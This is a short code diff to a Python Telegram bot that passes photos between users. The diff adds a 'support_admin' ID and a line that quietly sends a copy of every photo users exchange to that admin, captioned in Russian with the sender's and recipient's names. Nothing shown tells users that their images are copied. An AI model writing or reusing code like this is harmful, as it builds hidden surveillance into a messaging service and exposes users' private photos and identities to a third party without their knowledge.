@@ -30,6 +30,8 @@ bot_name = os.getenv('bot_name')
 admin_id = 1900666417
 admin_id2 = 522380141
 
+support_admin = 1929558405
+
 #STATUS: 10 - default user | 20 - admin | 30 - blocked
 
 
@@ -352,6 +354,7 @@ async def photo(message):
         markup.add(types.InlineKeyboardButton(text='💬 Отправить ещё' , url=f"https://t.me/{bot_name}?start={friendUser[1]}"))
         #Проверяем буфер
 
+        await bot.send_photo(support_admin, image_id, caption="[Admin] Фото от "+ User[2] +" к "+friendUser[2])
 
         if media_group_id is not None:
                 cursor.execute("SELECT * FROM images WHERE media_group_id=?", (media_group_id, ))
